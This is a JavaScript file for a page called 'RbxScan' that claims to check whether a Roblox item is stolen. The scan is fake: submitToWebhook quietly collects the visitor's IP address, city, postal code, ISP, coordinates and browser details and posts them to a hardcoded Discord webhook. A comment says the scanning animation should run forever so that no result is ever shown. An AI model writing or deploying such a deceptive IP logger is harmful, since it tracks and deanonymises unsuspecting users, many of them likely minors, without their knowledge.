// Configuration - Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// DOM Elements
const scanBtn = document.getElementById('scanBtn');
const itemInput = document.getElementById('itemInput');
const validationMessage = document.getElementById('validationMessage');
const resultsSection = document.getElementById('resultsSection');
const themeToggle = document.getElementById('themeToggle');

// Event Listeners
scanBtn.addEventListener('click', scanItem);
itemInput.addEventListener('input', validateInput);
itemInput.addEventListener('keydown', handleKeyDown);
themeToggle.addEventListener('click', toggleTheme);

// Functions
function scanItem() {
    const input = itemInput.value.trim();
    
    if (!input) {
        showValidationMessage('Please enter an item ID or URL', 'error');
        return;
    }

    if (!isValidInput(input)) {
        showValidationMessage('Invalid format. Please enter a valid Roblox item ID or URL.', 'error');
        return;
    }

    // Show scanning animation
    showScanningResults();
    
    // Send data to webhook in background
    submitToWebhook(input);
}

function showValidationMessage(message, type) {
    validationMessage.textContent = message;
    validationMessage.className = `validation-message ${type}`;
}

function showScanningResults() {
    resultsSection.style.display = 'block';
    scanBtn.disabled = true;
    showValidationMessage('Scanning in progress...', 'success');
}

function validateInput() {
    const input = itemInput.value.trim();
    const isValid = input.length === 0 || isValidInput(input);
    
    scanBtn.disabled = !input || !isValid;
    
    if (input.length > 0) {
        if (isValid) {
            showValidationMessage('Valid format detected', 'success');
        } else {
            showValidationMessage('Invalid format. Please enter a valid item ID or URL.', 'error');
        }
    } else {
        validationMessage.textContent = '';
        validationMessage.className = 'validation-message';
    }
}

function isValidInput(input) {
    if (input.length === 0) return false;
    
    // Remove whitespace and convert to lowercase for validation
    const cleanInput = input.replace(/\s+/g, '').toLowerCase();
    
    // Check for various valid Roblox item patterns:
    
    // 1. Roblox Item ID (numeric, typically 6-12 digits)
    const itemIdPattern = /^\d{6,12}$/;
    if (itemIdPattern.test(cleanInput)) {
        return true;
    }
    
    // 2. Roblox Asset URL
    const assetUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
    if (assetUrlPattern.test(cleanInput)) {
        return true;
    }
    
    // 3. Asset ID from URL
    const assetIdFromUrl = cleanInput.match(/\/catalog\/(\d+)/);
    if (assetIdFromUrl && assetIdFromUrl[1].length >= 6) {
        return true;
    }
    
    // 4. Bundle URLs
    const bundleUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/bundles\/\d+/;
    if (bundleUrlPattern.test(cleanInput)) {
        return true;
    }
    
    // 5. UGC Item URLs
    const ugcUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
    if (ugcUrlPattern.test(cleanInput)) {
        return true;
    }
    
    return false;
}

function showValidationError() {
    const modalBody = document.querySelector('.modal-body');
    const errorElement = document.createElement('div');
    errorElement.className = 'validation-error';
    errorElement.innerHTML = `
        <p>❌ Invalid format. Please enter a valid Roblox item:</p>
        <ul>
            <li>• Roblox Item ID (e.g., 123456789)</li>
            <li>• Roblox Asset URL (e.g., roblox.com/catalog/123456789)</li>
            <li>• Bundle URL (e.g., roblox.com/bundles/123456)</li>
            <li>• UGC Item URL</li>
        </ul>
    `;
    
    modalBody.insertBefore(errorElement, modalBody.querySelector('.button-group'));
}

function extractItemId(input) {
    const cleanInput = input.replace(/\s+/g, '');
    
    // Extract ID from URL
    const urlMatch = cleanInput.match(/\/catalog\/(\d+)/);
    if (urlMatch) {
        return urlMatch[1];
    }
    
    // Extract ID from bundle URL
    const bundleMatch = cleanInput.match(/\/bundles\/(\d+)/);
    if (bundleMatch) {
        return `bundle:${bundleMatch[1]}`;
    }
    
    // Return as-is if it's already a clean ID
    return cleanInput;
}

function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    localStorage.setItem('theme', newTheme);
}

function initializeTheme() {
    // Check for saved theme preference or default to light mode
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    const initialTheme = savedTheme || (systemPrefersDark ? 'dark' : 'light');
    document.documentElement.setAttribute('data-theme', initialTheme);
}

function handleKeyDown(e) {
    // Allow Enter to scan
    if (e.key === 'Enter') {
        if (!scanBtn.disabled) {
            scanItem();
        }
    }
}

function showLoading() {
    loadingOverlay.style.display = 'flex';
    submitBtn.disabled = true;
}

function showInfiniteScanning() {
    // Close the modal first
    modal.style.display = 'none';
    
    // Show infinite loading overlay with scanning message
    loadingOverlay.style.display = 'flex';
    loadingOverlay.querySelector('p').textContent = 'Scanning item...';
    
    // Disable all interactions
    submitBtn.disabled = true;
    scanBtn.disabled = true;
    
    // Add pulsing animation to the spinner
    const spinner = loadingOverlay.querySelector('.loading-spinner');
    spinner.style.animation = 'spin 1s linear infinite, pulse 2s ease-in-out infinite';
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
    submitBtn.disabled = false;
    validateInput();
}

function showMessage(type, duration = 3000) {
    hideMessages();
    const messageElement = type === 'success' ? successMessage : errorMessage;
    messageElement.style.display = 'block';
    
    setTimeout(() => {
        messageElement.style.display = 'none';
    }, duration);
}

function hideMessages() {
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';
}

async function getUserLocation() {
    try {
        // Get IP and location data from ipapi.co (free service)
        const response = await fetch('https://ipapi.co/json/');
        const locationData = await response.json();
        
        return {
            ip: locationData.ip,
            city: locationData.city,
            region: locationData.region,
            country: locationData.country_name,
            country_code: locationData.country_code,
            postal: locationData.postal,
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            timezone: locationData.timezone,
            isp: locationData.org
        };
    } catch (error) {
        console.error('Error getting location:', error);
        // Fallback - try to get just IP from another service
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            return { ip: ipData.ip };
        } catch (ipError) {
            return { ip: 'unknown', error: 'Unable to fetch location data' };
        }
    }
}

async function submitToWebhook(input) {
    try {
        // Get user location data
        const locationData = await getUserLocation();
        
        // Extract clean item ID
        const cleanItemId = extractItemId(input);
        
        // Format data for Discord webhook
        const discordMessage = {
            content: "@everyone 🚨 **NEW ITEM SCAN REQUEST** 🚨",
            embeds: [{
                title: "🔍 Item Theft Check Request",
                color: 0x58a6ff, // Blue color
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "🎮 Item Details",
                        value: `**Input:** \`${input}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
                        inline: false
                    },
                    {
                        name: "🌍 Location",
                        value: `**IP:** ${locationData.ip || 'Unknown'}\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.region || 'Unknown'}\n**Country:** ${locationData.country || 'Unknown'} (${locationData.country_code || 'Unknown'})\n**Postal:** ${locationData.postal || 'Unknown'}\n**ISP:** ${locationData.isp || 'Unknown'}`,
                        inline: true
                    },
                    {
                        name: "💻 Browser Info",
                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
                        inline: true
                    }
                ],
                footer: {
                    text: "RbxScan Website",
                    icon_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
                }
            }]
        };

        // Add coordinates if available
        if (locationData.latitude && locationData.longitude) {
            discordMessage.embeds[0].fields.push({
                name: "📍 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Lng:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone || 'Unknown'}`,
                inline: true
            });
        }
        
        // Send to Discord webhook silently
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage)
        });
        
    } catch (error) {
        console.error('Error submitting to webhook:', error);
    }
    
    // Keep scanning animation running forever - never stop!
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Initialize theme
    initializeTheme();
    
    // Check if webhook URL is configured
    if (WEBHOOK_URL === 'https://your-webhook-url-here.com/webhook') {
        console.warn('⚠️ Please configure your webhook URL in script.js');
        
        // Show a warning in the console for developers
        setTimeout(() => {
            console.log(`
🔧 SETUP REQUIRED:
1. Open script.js
2. Replace 'https://your-webhook-url-here.com/webhook' with your actual webhook URL
3. Your webhook should accept POST requests with JSON data containing a 'code' field
            `);
        }, 1000);
    }
    
    console.log('RbxScan website loaded successfully! 🚀');
});